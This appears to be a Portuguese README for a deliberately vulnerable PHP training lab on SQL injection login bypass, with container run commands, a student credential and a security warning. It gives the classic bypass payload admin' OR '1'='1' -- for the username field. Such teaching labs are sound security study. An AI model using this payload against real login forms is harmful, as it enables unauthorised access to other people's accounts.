# SQL Injection Login Lab - PHP

Laboratório local e intencionalmente vulnerável para estudar bypass lógico de login via SQL Injection.

## Rodando com Docker Compose ou Podman compatível

```bash
FLAG_ID='ACT{aluno-001}' docker compose up --build
```

Acesse:

```text
http://localhost:5000
```

## Rodando com Podman sem Compose

```bash
podman build -t sqli-login-lab-php .
podman run --rm -p 5000:80 -e FLAG_ID='ACT{aluno-001}' sqli-login-lab-php
```

## Credencial normal

```text
usuario: student
senha: student123
```

## Payload de bypass

No campo usuario:

```text
admin' OR '1'='1' --
```

No campo senha, qualquer valor.

## Observação de segurança

Este projeto é propositalmente vulnerável. Use somente em ambiente local ou controlado.
Não use concatenação de SQL com entrada do usuário em sistemas reais.
